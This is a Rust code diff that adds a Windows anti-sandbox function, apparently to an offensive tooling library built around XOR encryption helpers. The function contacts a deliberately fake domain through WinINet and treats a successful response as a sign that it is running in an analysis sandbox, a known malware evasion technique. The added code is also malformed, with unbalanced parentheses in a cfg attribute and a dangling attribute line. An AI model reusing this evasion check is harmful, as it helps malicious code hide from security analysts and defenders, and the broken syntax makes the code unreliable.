@@ -24,3 +24,28 @@ pub fn xor_encrypt_decrypt(key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn E
     let text: &[u8] = &equalilzed.1[..];
     xor_u8_slices(key, text)
 }
+
+#[cfg(windows)]
+extern crate windows;
+#[cfg(windows)]
+use windows::Win32::Foundation::PSTR;
+#[cfg(windows)]
+use std::{mem, ptr};
+#[cfg(windows)]
+
+#[cfg(all((windows), feature = "antisand")]
+pub fn pound_sand() -> bool {
+    let mut lpsz_agent: PSTR = unsafe { mem::zeroed() };
+    lpsz_agent.0 = CString::new("Name in user-agent").unwrap().into_raw() as *mut u8;
+    let lpsz_proxy: PSTR = unsafe { mem::zeroed() };
+    let lpsz_proxy_bypass: PSTR = unsafe { mem::zeroed() };
+    let internet_handle = unsafe { InternetOpenA(lpsz_agent, 0, lpsz_proxy, lpsz_proxy_bypass, 0) };
+    let mut lpsz_url: PSTR = unsafe { mem::zeroed() };
+    lpsz_url.0 = CString::new("https://www.thisisafakewebsiteorelsetheantisanboxcheckwillfail4sure.com").unwrap().into_raw() as *mut u8;
+    let lpsz_headers: PSTR = unsafe { mem::zeroed() };
+    let website = unsafe { InternetOpenUrlA(internet_handle, lpsz_url, lpsz_headers, 0, 0, 0) };
+    if website != 0 as _ {
+        return true
+    }
+    false
+}
